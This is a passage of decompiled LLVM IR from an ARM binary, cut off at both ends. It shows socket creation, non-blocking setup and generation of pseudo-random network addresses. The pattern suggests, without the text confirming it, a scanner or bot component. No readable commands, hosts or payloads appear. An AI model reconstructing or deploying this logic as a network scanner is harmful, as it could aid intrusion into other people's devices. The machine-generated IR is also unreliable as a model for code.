  %v7_82d0 = icmp sgt i32 %v2_82c0, %v3_82c8
  br i1 %v7_82d0, label %dec_label_pc_82d4, label %dec_label_pc_8300

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82bc
  %v0_82d4 = load i32, i32* @sb, align 4
  %v2_82d4 = add i32 %v0_82d4, %v3_82c8
  %v3_82d4 = inttoptr i32 %v2_82d4 to i8*
  %v4_82d4 = load i8, i8* %v3_82d4, align 1
  %v6_82d4 = zext i8 %v4_82d4 to i32
  %v1_82d8 = add nsw i32 %v6_82d4, -32
  store i32 %v1_82d8, i32* %r2.global-to-local, align 4
  %v1_82dc = add nsw i32 %v6_82d4, -97
  store i32 %v1_82dc, i32* %r3.global-to-local, align 4
  %v2_82e0 = icmp ugt i32 %v1_82dc, 24
  store i1 %v2_82e0, i1* %cpsr_c.global-to-local, align 1
  %v7_82e0 = icmp eq i32 %v1_82dc, 25
  store i1 %v7_82e0, i1* %cpsr_z.global-to-local, align 1
  %v2_82e4 = xor i1 %v2_82e0, true
  %v3_82e4 = or i1 %v7_82e0, %v2_82e4
  br i1 %v3_82e4, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_82d4
  %v5_82e4 = trunc i32 %v1_82d8 to i8
  store i8 %v5_82e4, i8* %v3_82d4, align 1
  %v0_82e8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_82e8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_82d4, %bb171
  %v1_82ec = phi i1 [ %v2_82e0, %dec_label_pc_82d4 ], [ %v1_82e8.pre, %bb171 ]
  %v0_82ec = phi i1 [ false, %dec_label_pc_82d4 ], [ %v0_82e8.pre, %bb171 ]
  %v2_82e8 = xor i1 %v1_82ec, true
  %v3_82e8 = or i1 %v0_82ec, %v2_82e8
  br i1 %v3_82e8, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_82f4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v7_82ec = load i32, i32* %v11_82b4, align 4
  store i32 %v7_82ec, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_82f4 = phi i32 [ %v0_82f4.pre, %._crit_edge ], [ %v7_82ec, %bb173 ]
  store i32 %v10_82b0, i32* @lr, align 4
  %v1_82f4 = add i32 %v0_82f4, 1
  store i32 %v1_82f4, i32* %ip.global-to-local, align 4
  store i32 %v1_82f4, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82bc

dec_label_pc_8300:                                ; preds = %dec_label_pc_82bc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8304 = call i32 @function_11be8(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_830c = call i32 @function_11be8(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8314 = call i32 @function_11be8(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_831c = call i32 @function_11be8(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8324 = call i32 @function_11be8(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_832c = call i32 @function_11be8(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8334 = call i32 @function_11be8(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_833c = call i32 @function_11be8(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_11be8(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_11be8(i32 45)
  store i32 %v1_834c, i32* %r0.global-to-local, align 4
  %v0_8350 = load i32, i32* @r6, align 4
  %v3_8350 = icmp ugt i32 %v0_8350, 255
  store i1 %v3_8350, i1* %cpsr_c.global-to-local, align 1
  %v8_8350 = icmp eq i32 %v0_8350, 256
  store i1 %v8_8350, i1* %cpsr_z.global-to-local, align 1
  %v5_8354 = icmp slt i32 %v0_8350, 256
  br i1 %v5_8354, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8300
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8300, %bb175
  %v0_835c = phi i32 [ 256, %bb175 ], [ %v0_8350, %dec_label_pc_8300 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_8360 = call i32 @function_11be8(i32 46)
  store i32 %v0_835c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_8370 = call i32 @function_144a8(i32 %v0_835c, i32 3140)
  store i32 %v2_8370, i32* %r0.global-to-local, align 4
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8378 = icmp eq i32 %v0_835c, 0
  store i1 %v2_8378, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_835c, 1
  br i1 %tmp176, label %dec_label_pc_84bc, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %thread-pre-split
  store i32 %v2_8370, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_83b0 = and i32 %arg1, 536870912
  %v3_83b0 = icmp ne i32 %v2_83b0, 0
  %v5_83b0 = mul i32 %arg1, 24
  %v2_83b4 = add i32 %v5_83b0, %arg2
  %v1_83b8 = add i32 %v2_83b4, 16
  %v2_83b8 = inttoptr i32 %v1_83b8 to i32*
  br label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_8384
  %v1_8398 = phi i32 [ %v1_9e20, %dec_label_pc_9e04 ], [ %v2_8370, %dec_label_pc_8384 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_8398 = inttoptr i32 %v1_8398 to i32*
  store i32 -1, i32* %v2_8398, align 4
  %v0_839c = load i32, i32* %r3.global-to-local, align 4
  %v1_839c = trunc i32 %v0_839c to i8
  %v2_839c = load i32, i32* @r5, align 4
  %v3_839c = add i32 %v2_839c, 4
  %v4_839c = inttoptr i32 %v3_839c to i8*
  store i8 %v1_839c, i8* %v4_839c, align 1
  %v0_83a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_83a0, i32* %r0.global-to-local, align 4
  %v2_83a4 = call i32 @function_12cb0(i32 %v0_83a0, i32 %arg1)
  store i32 %v2_83a4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i1 %v3_83b0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_83b0, i32* %r3.global-to-local, align 4
  store i32 %v2_83b4, i32* @r6, align 4
  %v3_83b8 = load i32, i32* %v2_83b8, align 4
  store i32 %v3_83b8, i32* %r2.global-to-local, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 532
  store i32 %v1_83bc, i32* @lr, align 4
  store i32 %v1_83bc, i32* @r0, align 4
  %v0_83c4 = load i32, i32* @r8, align 4
  store i32 %v0_83c4, i32* %r1.global-to-local, align 4
  %v2_83c8 = add i32 %v0_83bc, 16
  %v3_83c8 = inttoptr i32 %v2_83c8 to i32*
  store i32 %v3_83b8, i32* %v3_83c8, align 4
  %v0_83cc = load i32, i32* @lr, align 4
  %v2_83d0 = inttoptr i32 %v1_83bc to i8*
  %v3_83d0 = call i32 @function_124a8(i8* %v2_83d0, i32 %v0_83c4)
  store i32 %v3_83d0, i32* %r0.global-to-local, align 4
  %v0_83d4 = load i32, i32* @r5, align 4
  %v1_83d4 = add i32 %v0_83d4, 532
  %v2_83d4 = inttoptr i32 %v1_83d4 to i8*
  %v3_83d4 = load i8, i8* %v2_83d4, align 1
  %v4_83d4 = zext i8 %v3_83d4 to i32
  store i32 %v4_83d4, i32* %r3.global-to-local, align 4
  %v2_83d8 = icmp ugt i8 %v3_83d4, 46
  store i1 %v2_83d8, i1* %cpsr_c.global-to-local, align 1
  %v7_83d8 = icmp eq i8 %v3_83d4, 47
  store i1 %v7_83d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_83d8, label %dec_label_pc_8404, label %dec_label_pc_83e0

dec_label_pc_83e0:                                ; preds = %dec_label_pc_838c
  store i32 %v0_83cc, i32* %r0.global-to-local, align 4
  %v1_83e4 = inttoptr i32 %v0_83cc to i8*
  %v2_83e4 = call i32 @function_12480(i8* %v1_83e4)
  store i32 %v2_83e4, i32* @r2, align 4
  %v0_83ec = load i32, i32* @r5, align 4
  %v1_83f0 = add i32 %v0_83ec, 533
  store i32 %v1_83f0, i32* @r0, align 4
  store i32 %v0_83cc, i32* @r1, align 4
  %v3_83f8 = call i32 @function_13670(i32 %v1_83f0, i32 %v0_83cc, i32 %v2_83e4)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8400 = load i32, i32* @r5, align 4
  %v3_8400 = add i32 %v2_8400, 532
  %v4_8400 = inttoptr i32 %v3_8400 to i8*
  store i8 47, i8* %v4_8400, align 1
  %v0_8408.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8404

dec_label_pc_8404:                                ; preds = %dec_label_pc_838c, %dec_label_pc_83e0
  %v0_8408 = phi i32 [ %v0_83d4, %dec_label_pc_838c ], [ %v0_8408.pre, %dec_label_pc_83e0 ]
  %v0_8404 = load i32, i32* @sb, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v1_8408 = add i32 %v0_8408, 1440
  store i32 %v1_8408, i32* @r0, align 4
  %v2_840c = inttoptr i32 %v1_8408 to i8*
  %v3_840c = call i32 @function_124a8(i8* %v2_840c, i32 %v0_8404)
  %v0_8410 = load i32, i32* @r5, align 4
  %v0_8414 = load i32, i32* @sb, align 4
  store i32 %v0_8414, i32* %r1.global-to-local, align 4
  %v1_8418 = add i32 %v0_8410, 1431
  store i32 %v1_8418, i32* @r0, align 4
  %v2_841c = inttoptr i32 %v1_8418 to i8*
  %v3_841c = call i32 @function_124a8(i8* %v2_841c, i32 %v0_8414)
  %v0_8420 = load i32, i32* @r5, align 4
  %v1_8424 = add i32 %v0_8420, 789
  store i32 %v1_8424, i32* @r0, align 4
  %v0_8428 = load i32, i32* @sl, align 4
  store i32 %v0_8428, i32* %r1.global-to-local, align 4
  %v2_842c = inttoptr i32 %v1_8424 to i8*
  %v3_842c = call i32 @function_124a8(i8* %v2_842c, i32 %v0_8428)
  store i32 %v3_842c, i32* %r0.global-to-local, align 4
  %v0_8430 = load i32, i32* @r6, align 4
  %v1_8430 = add i32 %v0_8430, 20
  %v2_8430 = inttoptr i32 %v1_8430 to i8*
  %v3_8430 = load i8, i8* %v2_8430, align 1
  %v4_8430 = zext i8 %v3_8430 to i32
  store i32 %v4_8430, i32* %r3.global-to-local, align 4
  %v2_8434 = icmp ugt i8 %v3_8430, 30
  store i1 %v2_8434, i1* %cpsr_c.global-to-local, align 1
  %v7_8434 = icmp eq i8 %v3_8430, 31
  store i1 %v7_8434, i1* %cpsr_z.global-to-local, align 1
  %v2_8438 = xor i1 %v7_8434, true
  %v3_8438 = and i1 %v2_8434, %v2_8438
  br i1 %v3_8438, label %dec_label_pc_8480, label %dec_label_pc_843c

dec_label_pc_843c:                                ; preds = %dec_label_pc_8404
  %v1_843c = add i32 %v0_8430, 16
  %v2_843c = inttoptr i32 %v1_843c to i32*
  %v3_843c = load i32, i32* %v2_843c, align 4
  store i32 %v3_843c, i32* @r4, align 4
  %v0_8440 = call i32 @function_f700()
  store i32 %v0_8440, i32* %r0.global-to-local, align 4
  %v0_8444 = load i32, i32* @r4, align 4
  %v1_8444 = and i32 %v0_8444, 16711680
  store i32 %v1_8444, i32* %r1.global-to-local, align 4
  %v3_8448 = udiv i32 %v0_8444, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_844c = udiv i32 %v1_8444, 256
  %v5_844c = or i32 %v4_844c, %v3_8448
  store i32 %v5_844c, i32* %r2.global-to-local, align 4
  %v1_8450 = and i32 %v0_8444, 65280
  store i32 %v1_8450, i32* %r3.global-to-local, align 4
  %v0_8454 = load i32, i32* @r6, align 4
  %v1_8454 = add i32 %v0_8454, 20
  %v2_8454 = inttoptr i32 %v1_8454 to i8*
  %v3_8454 = load i8, i8* %v2_8454, align 1
  %v4_8454 = zext i8 %v3_8454 to i32
  %v5_845c = call i32 @llvm.bswap.i32(i32 %v0_8444)
  %v7_8460 = lshr i32 %v0_8440, %v4_8454
  %v8_8460 = add i32 %v7_8460, %v5_845c
  store i32 %v8_8460, i32* %r2.global-to-local, align 4
  %v1_8464 = and i32 %v8_8460, 16711680
  store i32 %v1_8464, i32* %r0.global-to-local, align 4
  %v1_8470 = and i32 %v8_8460, 65280
  store i32 %v1_8470, i32* %r1.global-to-local, align 4
  %v2_8478 = and i32 %v8_8460, 256
  %v3_8478 = icmp ne i32 %v2_8478, 0
  store i1 %v3_8478, i1* %cpsr_c.global-to-local, align 1
  %v5_8478 = call i32 @llvm.bswap.i32(i32 %v8_8460)
  store i32 %v5_8478, i32* %r3.global-to-local, align 4
  %v1_847c = load i32, i32* @r5, align 4
  %v2_847c = add i32 %v1_847c, 16
  %v3_847c = inttoptr i32 %v2_847c to i32*
  store i32 %v5_8478, i32* %v3_847c, align 4
  br label %dec_label_pc_8480

dec_label_pc_8480:                                ; preds = %dec_label_pc_8404, %dec_label_pc_843c
  %v0_8480 = call i32 @function_f700()
  %v3_848c = udiv i32 %v0_8480, 5
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  store i32 %v3_848c, i32* %r3.global-to-local, align 4
  %v2_8498 = sub i32 %v0_8480, %v3_848c
  store i32 %v2_8498, i32* %r0.global-to-local, align 4
  %v7_849c = icmp eq i32 %v2_8498, 4
  store i1 %v7_849c, i1* %cpsr_z.global-to-local, align 1
  %v5_84a0 = and i32 %v2_8498, 1073741824
  %v6_84a0 = icmp ne i32 %v5_84a0, 0
  store i1 %v6_84a0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_8498, label %dec_label_pc_9e04 [
    i32 0, label %dec_label_pc_9ec8
    i32 1, label %dec_label_pc_9e9c
    i32 2, label %dec_label_pc_9ef4
    i32 3, label %dec_label_pc_9ddc
    i32 4, label %dec_label_pc_9e5c
  ]

dec_label_pc_84bc:                                ; preds = %thread-pre-split
  %v0_84cc = load i32, i32* @r7, align 4
  %v1_84cc = and i32 %v0_84cc, 128
  %v2_84cc = icmp ne i32 %v1_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_c.global-to-local, align 1
  %v3_84cc = udiv i32 %v0_84cc, 256
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v1_84d0 = add i32 %v2_8370, 1452
  store i32 %v1_84d0, i32* %r1.global-to-local, align 4
  %v2_84d4 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_84d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_84ec.preheader

dec_label_pc_84ec.preheader:                      ; preds = %dec_label_pc_84bc, %dec_label_pc_9e28
  %v0_9e38.sink = phi i32 [ %v0_9e38, %dec_label_pc_9e28 ], [ %v0_84cc, %dec_label_pc_84bc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e38, %dec_label_pc_9e28 ], [ %v3_84cc, %dec_label_pc_84bc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e40, %dec_label_pc_9e28 ], [ %v2_84d4, %dec_label_pc_84bc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e3c, %dec_label_pc_9e28 ], [ %v1_84d0, %dec_label_pc_84bc ]
  %v1_9e44 = urem i32 %v0_9e38.sink, 256
  store i32 %v1_9e44, i32* @r7, align 4
  %v2_8654 = ptrtoint i32* %stack_var_-152 to i32
  %v2_866c = ptrtoint i32* %stack_var_-44 to i32
  %v2_86b4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_86d0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88b0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c0c = icmp eq i32 %v6_81bc, 0
  %v1_8b08 = inttoptr i32 %v6_81bc to i8*
  %v2_8738 = ptrtoint i32* %stack_var_-60 to i32
  %v2_873c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8740 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8820 = ptrtoint i32* %stack_var_-48 to i32
  %v2_882c = ptrtoint i32* %stack_var_-52 to i32
  %v4_868c = mul nuw nsw i32 %v1_9e44, 256
  %v5_868c = or i32 %v4_868c, %stack_var_-20864.0.ph
  br label %dec_label_pc_84ec

dec_label_pc_84ec:                                ; preds = %dec_label_pc_8718, %dec_label_pc_854c, %dec_label_pc_8710, %dec_label_pc_87ac, %dec_label_pc_84ec.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_84f0 = call i32 @function_12d98(i32* null)
  store i32 %v2_84f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_851c225 = load i32, i32* @sp, align 4
  %v3_851c226 = add i32 %v2_851c225, 20688
  %v4_851c227 = inttoptr i32 %v3_851c226 to i32*
  store i32 0, i32* %v4_851c227, align 4
  br label %dec_label_pc_8508.dec_label_pc_8508_crit_edge

dec_label_pc_8508.dec_label_pc_8508_crit_edge:    ; preds = %dec_label_pc_84ec, %dec_label_pc_8508.dec_label_pc_8508_crit_edge
  %v0_8508.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_850c = add i32 %v0_8508.pre, 4
  store i32 %v1_850c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8514 = add i32 %v0_8508.pre, 20684
  store i32 %v1_8514, i32* @lr, align 4
  %v7_8518 = icmp eq i32 %v1_850c, 128
  %v2_851c = load i32, i32* @sp, align 4
  %v3_851c = add i32 %v2_851c, %v1_8514
  %v4_851c = inttoptr i32 %v3_851c to i32*
  store i32 0, i32* %v4_851c, align 4
  br i1 %v7_8518, label %dec_label_pc_8524, label %dec_label_pc_8508.dec_label_pc_8508_crit_edge

dec_label_pc_8524:                                ; preds = %dec_label_pc_8508.dec_label_pc_8508_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v0_8528 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8528, i32* %stack_var_-332, align 4
  %v0_852c = load i32, i32* %r3.global-to-local, align 4
  %v1_8534228 = add i32 %v0_852c, -120
  store i32 %v1_8534228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_853c229 = add i32 %v0_852c, 20432
  store i32 %v1_853c229, i32* %r2.global-to-local, align 4
  %v7_8540230 = icmp eq i32 %v1_8534228, 128
  %v2_8544231 = load i32, i32* @sp, align 4
  %v3_8544232 = add i32 %v2_8544231, %v1_853c229
  %v4_8544233 = inttoptr i32 %v3_8544232 to i32*
  store i32 0, i32* %v4_8544233, align 4
  br i1 %v7_8540230, label %dec_label_pc_854c, label %dec_label_pc_8530.dec_label_pc_8530_crit_edge

dec_label_pc_8530.dec_label_pc_8530_crit_edge:    ; preds = %dec_label_pc_8524, %dec_label_pc_8530.dec_label_pc_8530_crit_edge
  %v0_8530.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8534 = add i32 %v0_8530.pre, 4
  store i32 %v1_8534, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_853c = add i32 %v0_8530.pre, 20556
  store i32 %v1_853c, i32* %r2.global-to-local, align 4
  %v7_8540 = icmp eq i32 %v1_8534, 128
  %v2_8544 = load i32, i32* @sp, align 4
  %v3_8544 = add i32 %v2_8544, %v1_853c
  %v4_8544 = inttoptr i32 %v3_8544 to i32*
  store i32 0, i32* %v4_8544, align 4
  br i1 %v7_8540, label %dec_label_pc_854c, label %dec_label_pc_8530.dec_label_pc_8530_crit_edge

dec_label_pc_854c:                                ; preds = %dec_label_pc_8530.dec_label_pc_8530_crit_edge, %dec_label_pc_8524
  store i32 %v0_835c, i32* %r3.global-to-local, align 4
  %v1_8550 = load i32, i32* %r0.global-to-local, align 4
  %v3_8550 = icmp uge i32 %v0_835c, %v1_8550
  store i1 %v3_8550, i1* %cpsr_c.global-to-local, align 1
  %v9_8550 = icmp eq i32 %v0_835c, %v1_8550
  store i1 %v9_8550, i1* %cpsr_z.global-to-local, align 1
  %v7_8554 = icmp sgt i32 %v0_835c, %v1_8550
  br i1 %v7_8554, label %dec_label_pc_8558, label %dec_label_pc_84ec

dec_label_pc_8558:                                ; preds = %dec_label_pc_854c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8550, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8550, i32* @r7, align 4
  br label %dec_label_pc_85cc

dec_label_pc_856c:                                ; preds = %dec_label_pc_85e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_856c = icmp eq i8 %v3_85cc, 2
  store i1 %v7_856c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_856c, label %dec_label_pc_8cac, label %dec_label_pc_8574

dec_label_pc_8574:                                ; preds = %dec_label_pc_856c
  %v2_8574 = icmp ugt i8 %v3_85cc, 3
  store i1 %v2_8574, i1* %cpsr_c.global-to-local, align 1
  %v7_8574 = icmp eq i8 %v3_85cc, 4
  store i1 %v7_8574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8574, label %dec_label_pc_887c, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_8574
  %v1_857c = add nsw i32 %v4_85cc, -6
  %v2_857c = icmp ugt i8 %v3_85cc, 5
  store i1 %v2_857c, i1* %cpsr_c.global-to-local, align 1
  %v7_857c = icmp eq i8 %v3_85cc, 6
  store i1 %v7_857c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_857c, label %dec_label_pc_8cdc, label %dec_label_pc_8584

dec_label_pc_8584:                                ; preds = %dec_label_pc_857c
  %v2_8584 = icmp ugt i8 %v3_85cc, 6
  store i1 %v2_8584, i1* %cpsr_c.global-to-local, align 1
  %v7_8584 = icmp eq i8 %v3_85cc, 7
  store i1 %v7_8584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8584, label %dec_label_pc_8f18, label %dec_label_pc_858c

dec_label_pc_858c:                                ; preds = %dec_label_pc_8584
  %v2_858c = icmp ugt i8 %v3_85cc, 9
  store i1 %v2_858c, i1* %cpsr_c.global-to-local, align 1
  %v7_858c = icmp eq i8 %v3_85cc, 10
  store i1 %v7_858c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_858c, label %dec_label_pc_8f6c, label %dec_label_pc_8594

dec_label_pc_8594:                                ; preds = %dec_label_pc_858c
  %v1_8594 = add nsw i32 %v4_85cc, -11
  %v2_8594 = icmp ugt i8 %v3_85cc, 10
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  %v7_8594 = icmp eq i8 %v3_85cc, 11
  store i1 %v7_8594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8594, label %dec_label_pc_952c, label %dec_label_pc_859c

dec_label_pc_859c:                                ; preds = %dec_label_pc_8cac, %dec_label_pc_8594
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_85cc, align 1
  %v0_85a4 = load i32, i32* @r6, align 4
  %v1_85a4 = add i32 %v0_85a4, -1452
  %v2_85a4 = inttoptr i32 %v1_85a4 to i32*
  %v3_85a4 = load i32, i32* %v2_85a4, align 4
  store i32 %v3_85a4, i32* %r0.global-to-local, align 4
  %v1_85a8 = call i32 @function_1314c(i32 %v3_85a4)
  store i32 %v1_85a8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85b0 = load i32, i32* @r6, align 4
  %v2_85b0 = add i32 %v1_85b0, -1452
  %v3_85b0 = inttoptr i32 %v2_85b0 to i32*
  store i32 -1, i32* %v3_85b0, align 4
  br label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_8cdc, %dec_label_pc_86d8, %dec_label_pc_85e8, %dec_label_pc_8f6c, %dec_label_pc_8f18, %dec_label_pc_952c, %bb180, %dec_label_pc_859c
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_85b8 = load i32, i32* @r7, align 4
  %v1_85b8 = add i32 %v0_85b8, 1
  store i32 %v1_85b8, i32* @r7, align 4
  %v0_85bc = load i32, i32* @r6, align 4
  %v3_85c0 = icmp uge i32 %v1_85b8, %v0_835c
  store i1 %v3_85c0, i1* %cpsr_c.global-to-local, align 1
  %v9_85c0 = icmp eq i32 %v1_85b8, %v0_835c
  store i1 %v9_85c0, i1* %cpsr_z.global-to-local, align 1
  %v1_85c4 = add i32 %v0_85bc, 3140
  store i32 %v1_85c4, i32* @r6, align 4
  br i1 %v9_85c0, label %dec_label_pc_85b4.dec_label_pc_8710_crit_edge, label %dec_label_pc_85cc

dec_label_pc_85b4.dec_label_pc_8710_crit_edge:    ; preds = %dec_label_pc_85b4
  %v0_8710.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8710

dec_label_pc_85cc:                                ; preds = %dec_label_pc_86f8, %dec_label_pc_85b4, %dec_label_pc_8558
  %v3_8870 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8558 ], [ %v1_85c4, %dec_label_pc_85b4 ], [ %v1_8708, %dec_label_pc_86f8 ]
  %v1_85cc = add i32 %v3_8870, -1448
  %v2_85cc = inttoptr i32 %v1_85cc to i8*
  %v3_85cc = load i8, i8* %v2_85cc, align 1
  %v4_85cc = zext i8 %v3_85cc to i32
  store i32 %v4_85cc, i32* @r3, align 4
  %v2_85d4 = icmp ne i8 %v3_85cc, 0
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v6_85d4 = icmp eq i8 %v3_85cc, 0
  %v7_85d4 = icmp eq i8 %v3_85cc, 1
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  %v1_85d8 = add i32 %v3_8870, -1452
  store i32 %v1_85d8, i32* @r5, align 4
  br i1 %v7_85d4, label %dec_label_pc_8864, label %dec_label_pc_85e0

dec_label_pc_85e0:                                ; preds = %dec_label_pc_85cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_85d4, label %dec_label_pc_85e8, label %dec_label_pc_856c

dec_label_pc_85e8:                                ; preds = %.thread19.dec_label_pc_85e8_crit_edge, %dec_label_pc_85e0
  %v0_85e8 = phi i32 [ %v0_85e8.pre, %.thread19.dec_label_pc_85e8_crit_edge ], [ %v3_8870, %dec_label_pc_85e0 ]
  %v1_85e8 = add i32 %v0_85e8, -1452
  %v2_85e8 = inttoptr i32 %v1_85e8 to i32*
  %v3_85e8 = load i32, i32* %v2_85e8, align 4
  store i32 %v3_85e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v2_85f4 = icmp eq i32 %v3_85e8, -1
  store i1 %v2_85f4, i1* %cpsr_c.global-to-local, align 1
  %v7_85f4 = icmp eq i32 %v3_85e8, -1
  store i1 %v7_85f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34316, i32* @lr, align 4
  %v1_8608 = xor i1 %v7_85f4, true
  call void @__pseudo_cond_branch(i1 %v1_8608, i32 ptrtoint (i32* @global_var_1314c.22 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8614 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8614, i32* %r2.global-to-local, align 4
  %v3_8618 = call i32 @function_13940(i32 2, i32 1, i32 %v0_8614)
  store i32 %v3_8618, i32* %r0.global-to-local, align 4
  %v2_861c = icmp eq i32 %v3_8618, -1
  store i1 %v2_861c, i1* %cpsr_c.global-to-local, align 1
  %v7_861c = icmp eq i32 %v3_8618, -1
  store i1 %v7_861c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8618, i32* @r4, align 4
  %v1_8624 = load i32, i32* @r6, align 4
  %v2_8624 = add i32 %v1_8624, -1452
  %v3_8624 = inttoptr i32 %v2_8624 to i32*
  store i32 %v3_8618, i32* %v3_8624, align 4
  br i1 %v7_861c, label %dec_label_pc_85b4, label %dec_label_pc_862c

dec_label_pc_862c:                                ; preds = %dec_label_pc_85e8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8630 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8630, i32* %r2.global-to-local, align 4
  %v2_8634 = call i32 @function_12f80(i32 %v3_8618, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_863c = or i32 %v2_8634, 2048
  store i32 %v1_863c, i32* %r2.global-to-local, align 4
  %v0_8640 = load i32, i32* @r4, align 4
  store i32 %v0_8640, i32* %r0.global-to-local, align 4
  %v2_8644 = call i32 @function_12f80(i32 %v0_8640, i32 4)
  store i32 %v2_8644, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_8654, i32* %r3.global-to-local, align 4
